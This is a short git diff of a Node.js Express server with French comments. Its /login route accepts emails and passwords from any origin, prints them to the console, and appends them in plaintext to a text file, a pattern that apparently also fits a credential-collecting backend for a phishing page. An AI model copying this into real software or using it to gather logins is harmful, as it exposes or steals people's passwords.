@@ -9,21 +9,13 @@ const port = 3000;
 app.use(cors()); // Autoriser les requêtes externes
 app.use(express.json()); // Parser les données JSON
 
-
-
+// Route POST pour recevoir les identifiants
 app.post('/login', (req, res) => {
     const { email, password } = req.body;
+
     console.log('Requête reçue avec les données :', req.body);
-    res.send('Identifiants reçus et enregistrés.');
-});
 
-
-
-    app.get('/', (req, res) => {
-        res.send('Bienvenue sur mon serveur Node.js !');
-    });
-    
-
+    // Vérifier si les identifiants sont présents
     if (!email || !password) {
         console.log('Données invalides :', req.body);
         return res.status(400).send('Email et mot de passe requis.');
@@ -31,6 +23,7 @@ app.post('/login', (req, res) => {
 
     const dataToWrite = `Email: ${email}, Password: ${password}\n`;
 
+    // Écrire les identifiants dans le fichier identifiants.txt
     fs.appendFile('identifiants.txt', dataToWrite, (err) => {
         if (err) {
             console.error('Erreur lors de l\'enregistrement :', err);
@@ -40,7 +33,12 @@ app.post('/login', (req, res) => {
         console.log('Identifiants enregistrés :', dataToWrite.trim());
         res.send('Identifiants reçus et enregistrés.');
     });
+});
 
+// Route GET pour tester la connexion
+app.get('/', (req, res) => {
+    res.send('Bienvenue sur mon serveur Node.js !');
+});
 
 // Démarrer le serveur
 app.listen(port, '0.0.0.0', () => {
